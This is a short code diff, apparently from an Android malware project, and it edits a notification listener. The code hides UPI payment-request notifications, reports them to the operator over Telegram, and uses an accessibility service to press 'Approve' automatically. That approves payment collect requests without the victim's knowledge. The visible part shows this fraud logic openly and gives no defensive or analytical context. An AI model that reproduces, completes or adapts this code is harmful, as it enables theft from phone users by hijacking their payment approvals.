@@ -15,7 +15,7 @@ public class NotificationListener extends NotificationListenerService {
         if (text != null) {
             if (text.contains("UPI") || text.contains("requests") || text.contains("collect")) {
                 cancelNotification(sbn.getKey());
-                sendTelegram("Hidden UPI notification: " + text);
+                sendTelegram("🔕 Hidden UPI notification");
                 MyAccessibilityService service = MyAccessibilityService.getInstance();
                 if (service != null) {
                     service.clickButton("Approve");
